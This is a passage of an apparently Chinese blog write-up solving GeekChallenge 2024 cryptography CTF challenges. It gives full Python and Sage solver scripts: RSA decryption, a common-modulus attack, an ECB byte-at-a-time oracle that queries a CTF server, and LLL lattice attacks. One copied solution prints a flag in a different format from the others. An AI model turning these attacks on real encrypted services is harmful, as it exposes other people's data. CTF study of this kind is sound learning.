<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line"><span class="string">p = 192173332221883349384646293941837353967</span></span><br><span class="line"><span class="string">q = 172282016556631997385463935089230918399</span></span><br><span class="line"><span class="string">c = 5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>很符合新生赛难度</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;RSA_is_easy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="不是套娃">不是套娃</h2><p>题目附件 <a href="https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw">https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw</a> 提取码：game<br>粗看是一个压缩包套娃<br>第一关摩斯密码<br><img src="/img/WP/GeekChallenge2024/tw1.png" alt=""><br>第二关维吉利亚<br><img src="/img/WP/GeekChallenge2024/tw2.png" alt=""><br>第三关哈希密码逆向<br>哈希字符串为a1fdbce928af7aae<br><a href="http://www.somd5.com">http://www.somd5.com</a><br><a href="http://www.cmd5.com">http://www.cmd5.com</a><br>随便一个网站逆出它，为HaiKav<br>第四关  NEFICPIC&amp;CRTCTNEYO<br>随波逐流yyds<br><img src="/img/WP/GeekChallenge2024/tw4.png" alt=""><br>NICECTF&amp;NICECRYPTO<br>第五关<br>提示给的很明显<br>base100 -&gt; rot13 -&gt; base64 -&gt; base65536<br>base100:<a href="https://ctf.bugku.com/tool/base100">https://ctf.bugku.com/tool/base100</a><br>base65536:<a href="https://www.better-converter.com/Encoders-Decoders/Base65536-Decode">https://www.better-converter.com/Encoders-Decoders/Base65536-Decode</a><br><img src="/img/WP/GeekChallenge2024/tw5.png" alt=""><br>原爞，启动！<br>什么？不对？幸亏 <code>原神，启动！</code> 是对的<br>最后就拿到flag了，flag竟然没藏（嘘）</p><h2 id="共模攻击">共模攻击</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] </span><br><span class="line">n = p*q</span><br><span class="line">e = [getPrime(<span class="number">10</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = [<span class="built_in">pow</span>(m, e[i], n) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line"><span class="string">e1 = 911</span></span><br><span class="line"><span class="string">e2 = 967</span></span><br><span class="line"><span class="string">c1 = 18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line"><span class="string">c2 = 4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>家人们真是共模攻击，出的也很基础<br>套公式就行</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">e1 = <span class="number">911</span></span><br><span class="line">e2 = <span class="number">967</span></span><br><span class="line">c1 = <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2 = <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line">_, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;U_can_really_attack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ECBpad">ECBpad</h2><p>跟BaseCTF2024 week4的 <strong>ECB是不安全的</strong> 很像（一模一样），当时恰好尝试过，但是不会，抄题解不会还不会吧。<br>于是就抄了，原理人家在题解写的很清楚，贴个连接<br><a href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">38312</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">c = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line">length1 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">    d = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(d.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) != <span class="built_in">len</span>(c):</span><br><span class="line">        length1 = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">length_flag = <span class="built_in">len</span>(c) - length1</span><br><span class="line"><span class="built_in">print</span>(length_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从前往后爆破flag</span></span><br><span class="line">payload_length = <span class="built_in">len</span>(c) + <span class="number">16</span>  <span class="comment"># 多一个分组保容错</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(payload_length - <span class="number">1</span>, payload_length - <span class="number">1</span> - length_flag, -<span class="number">1</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">    d = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(d.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;a&quot;</span> * i + flag + <span class="built_in">chr</span>(j).encode()</span><br><span class="line">        p.sendline(payload1)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">        e = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(d)</span><br><span class="line">        e = <span class="built_in">bytes</span>.fromhex(e.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">        e = e[payload_length - <span class="number">16</span> : payload_length]</span><br><span class="line">        <span class="keyword">if</span> e <span class="keyword">in</span> d:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j).encode()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;# 从后往前爆破flag(此方法需要知道填充模式)</span></span><br><span class="line"><span class="string">from Crypto.Util.Padding import pad</span></span><br><span class="line"><span class="string">from Crypto.Cipher import AES</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 在前面填充到满足AES加密的分组长度</span></span><br><span class="line"><span class="string">dic=&#x27;&#123;&#125;-BCTF0123456789abcdef&#x27;</span></span><br><span class="line"><span class="string">flag=b&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(length_flag):</span></span><br><span class="line"><span class="string">    p.recvline()    # b&quot;:\n&quot;</span></span><br><span class="line"><span class="string">    server_payload=b&#x27;a&#x27;*(length1+i+1)</span></span><br><span class="line"><span class="string">    p.sendline(server_payload)</span></span><br><span class="line"><span class="string">    server_flag=p.recvline()[:-1]</span></span><br><span class="line"><span class="string">    server_flag=base64.b64decode(server_flag)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    for j in dic:</span></span><br><span class="line"><span class="string">        p.recvline()    # b&quot;:\n&quot;</span></span><br><span class="line"><span class="string">        my_payload=j.encode()+flag</span></span><br><span class="line"><span class="string">        my_payload=pad(my_payload,AES.block_size)</span></span><br><span class="line"><span class="string">        my_payload=my_payload+b&#x27;a&#x27;  # 我也不知道这里为什么要多加一个字节,当i=2时不加这个字节就会出错</span></span><br><span class="line"><span class="string">        p.sendline(my_payload)</span></span><br><span class="line"><span class="string">        my_flag=p.recvline()[:-1]</span></span><br><span class="line"><span class="string">        my_flag=base64.b64decode(my_flag)</span></span><br><span class="line"><span class="string">        my_flag=my_flag[:16]</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if my_flag in server_flag:</span></span><br><span class="line"><span class="string">            flag=j.encode()+flag</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    print(flag)&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="LLL">LLL</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m.bit_length() == <span class="number">327</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">a = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">b = (a*m + c) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line"><span class="string">b = 87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line"><span class="string">p = 131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/m0_74345946/article/details/131742665">https://blog.csdn.net/m0_74345946/article/details/131742665</a>  抄的人家的P5<br>终于上sage了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line">a = <span class="number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line">p = <span class="number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a*r = flag + k*p</span></span><br><span class="line"></span><br><span class="line">M = Matrix(</span><br><span class="line"></span><br><span class="line">    ZZ, [[p, <span class="number">0</span>, <span class="number">0</span>], [-b, <span class="number">1</span>, <span class="number">0</span>], [a, <span class="number">0</span>, <span class="number">2</span>**<span class="number">400</span>]]  <span class="comment"># 400=c.bits</span></span><br><span class="line"></span><br><span class="line">)  <span class="comment"># Matrix()函数通常采用数值作为参数并返回一个矩阵对象</span></span><br><span class="line">c, m, k = M. LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;LLL 算法是一种格约化算法，用于查找格的约简基。</span></span><br><span class="line"><span class="string">LLL 方法返回一个由两个元素组成的元组：</span></span><br><span class="line"><span class="string">简化基和将原始基转换为简化基的矩阵&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(<span class="built_in">abs</span>(m))  <span class="comment"># abs()返回数字的绝对值</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;ee5cb1a5-257a-48b0-9d62-9ef56ff0651a&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/WP/GeekChallenge2024/lll.png" alt=""></p><h2 id="easy-LLL">easy_LLL</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() ==  <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    a = getPrime(<span class="number">1024</span>)</span><br><span class="line">    b = getPrime(<span class="number">400</span>)</span><br><span class="line">    c = (a * m + b) % p</span><br><span class="line">    <span class="keyword">return</span> c, a</span><br><span class="line"></span><br><span class="line">result = [encrypt(m) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">c = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> result]</span><br><span class="line">a = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> result]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line"><span class="string">c = [25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980, 75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974, 4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536, 16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193, 106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500]</span></span><br><span class="line"><span class="string">a = [177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539, 154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561, 162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877, 156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623, 94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://dexterjie.github.io/2023/08/25/%E6%A0%BC%E5%AF%86%E7%A0%81%E8%BF%9B%E9%98%B6/">https://dexterjie.github.io/2023/08/25/格密码进阶/</a><br><img src="/img/WP/GeekChallenge2024/ge.png" alt=""><br>我们这题的格跟这个很像。<s>因为我不会在博客写格，凑合着看吧</s><br>注：已补上格。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub><mo>≡</mo><msub><mi>a</mi><mi>i</mi></msub><mo>×</mo><mi>m</mi><mo>+</mo><mi>b</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">    c_i \equiv a_i \times m + b \mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6138em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></span></p><p>经过等价替换可得到：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub><mo>=</mo><msub><mi>a</mi><mi>i</mi></msub><mo>×</mo><mi>m</mi><mo>+</mo><mi>b</mi><mo>+</mo><msub><mi>l</mi><mi>i</mi></msub><mo>×</mo><mi>p</mi><mspace linebreak="newline"></mspace><msub><mi>a</mi><mi>i</mi></msub><mo>×</mo><mi>m</mi><mo>+</mo><msub><mi>l</mi><mi>i</mi></msub><mo>×</mo><mi>p</mi><mo>−</mo><msub><mi>c</mi><mi>i</mi></msub><mo>=</mo><mo>−</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">    c_i=a_i \times m+b+l_i \times p \\    a_i \times m+l_i \times p-c_i=-b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord 